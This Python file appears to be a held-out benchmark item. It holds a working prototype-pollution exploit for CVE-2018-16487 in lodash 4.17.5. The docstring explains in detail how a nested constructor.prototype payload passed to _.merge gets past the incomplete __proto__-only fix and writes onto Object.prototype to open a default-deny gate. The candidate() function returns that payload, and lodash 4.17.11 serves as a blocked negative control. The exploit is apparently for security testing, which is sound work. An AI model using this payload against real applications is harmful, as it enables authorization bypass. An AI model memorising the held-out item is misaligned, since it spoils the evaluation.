#!/usr/bin/env python3
"""[HELD-OUT] CVE-2018-16487 residual exploit -- the incomplete-fix bypass of lodash@4.17.5.

The CVE-2018-3721 fix (V1 = lodash@4.17.5) added `safeGet(object, key)` to baseMergeDeep, which returns
undefined only when `key == '__proto__'`. It special-cases the literal `__proto__` key ONLY. So a
`constructor.prototype` chain slips past: `constructor` is an ordinary key, `safeGet(object,'constructor')`
returns the real `Object` constructor FUNCTION, and this version still merges INTO a function objValue
directly (the branch `else if (!isObject(objValue) || (srcIndex && isFunction(objValue)))` -- for the FIRST
source `srcIndex` is 0, so the `isFunction` clone is skipped). The recursion therefore reaches the real
`Object.prototype` and adds `pcbUnlock` -- the write lands on a PROTOTYPE (prototype pollution). The benign
default-deny gate sees a fresh `({}).pcbUnlock` is now truthy and releases ${PCB_FLAG}. This is
CVE-2018-16487: the CVE-2018-3721 fix only guarded the `__proto__` key.

On V2 (lodash@4.17.11, the CVE-2018-16487 fix) baseMergeDeep clones ANY function objValue into a fresh
plain object (`else if (!isObject(objValue) || isFunction(objValue)) { newValue = initCloneObject(srcValue); }`
-- the `srcIndex &&` guard was removed), so merging `{prototype:...}` no longer lands on the real
`Object.prototype` -> nothing is added there. BLOCKED (negative control).

`payload` is JSON-encoded on the wire so the nested `constructor.prototype` structure survives to the sink.
Uses `_.merge` (NOT `_.defaultsDeep`, which stays pollutable via constructor.prototype until 4.17.12 =
the separate CVE-2019-10744) so V2 is a clean negative control for THIS incomplete-fix pair.
"""


# The residual payload nests the leaf under `constructor` -> `prototype`, which reaches the real
# Object.prototype via the Object constructor function while slipping past the V1 `__proto__`-only safeGet.
def candidate():
    return {
        "payload": {"constructor": {"prototype": {"pcbUnlock": True}}},
        "probe_id": "residual-cve-2018-16487-constructor-prototype-merge",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
